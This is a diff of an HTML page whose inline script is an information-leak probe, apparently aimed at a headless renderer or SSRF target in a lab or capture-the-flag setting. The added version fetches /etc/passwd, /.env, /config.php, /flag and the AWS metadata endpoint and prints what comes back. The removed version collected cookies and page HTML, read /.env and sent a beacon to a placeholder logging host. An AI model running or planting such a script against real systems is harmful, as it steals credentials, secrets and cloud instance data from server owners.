@@ -1,49 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>Where Am I?</title>
+  <title>Info Leak Attempt</title>
   <style>
-    body { font-family: monospace; white-space: pre-wrap; padding: 2em; background: #111; color: #0f0; }
+    body { font-family: monospace; white-space: pre-wrap; }
   </style>
 </head>
 <body>
-  <h1>🔍 Environment Leak Test</h1>
-  <div id="output">Loading...</div>
+<h1>Server Info Leak Attempt</h1>
+<div id="leak">Loading...</div>
 
-  <script>
-    (async () => {
-      const output = document.getElementById('output');
-      let result = "";
+<script>
+(async () => {
+  let txt = '';
 
-      // Current URL
-      result += "📍 Location: " + window.location.href + "\n\n";
+  // ננסה לקרוא קבצים פנימיים שאולי קיימים בשרת
+  const paths = [
+    '/etc/passwd',
+    '/.env',
+    '/config.php',
+    '/flag',
+    '/admin/secret',
+    'http://169.254.169.254/latest/meta-data/'  // metadata AWS
+  ];
 
-      // User Agent
-      result += "🧠 User Agent: " + navigator.userAgent + "\n\n";
+  for (const path of paths) {
+    try {
+      const res = await fetch(path);
+      const data = await res.text();
+      txt += `== ${path} ==\n${data.slice(0, 500)}\n\n`;
+    } catch (e) {
+      txt += `== ${path} ==\nFetch failed: ${e.message}\n\n`;
+    }
+  }
 
-      // Document cookies
-      result += "🍪 Cookies: " + document.cookie + "\n\n";
-
-      // HTML snippet
-      result += "📄 HTML Snippet:\n" + document.documentElement.outerHTML.slice(0, 1000) + "\n\n";
-
-      // Attempt fetch to internal file (example)
-      try {
-        const res = await fetch('/.env');
-        const text = await res.text();
-        result += `📁 /.env response (${res.status}):\n` + text.slice(0, 500) + "\n\n";
-      } catch (err) {
-        result += "❌ Error fetching /.env: " + err.message + "\n\n";
-      }
-
-      // Remote ping (change to your server!)
-      const pingUrl = "https://your-logging-server.example.com/ping?ua=" + encodeURIComponent(navigator.userAgent);
-      const img = new Image();
-      img.src = pingUrl;
-
-      output.textContent = result;
-    })();
-  </script>
+  document.getElementById("leak").textContent = txt;
+})();
+</script>
 </body>
 </html>
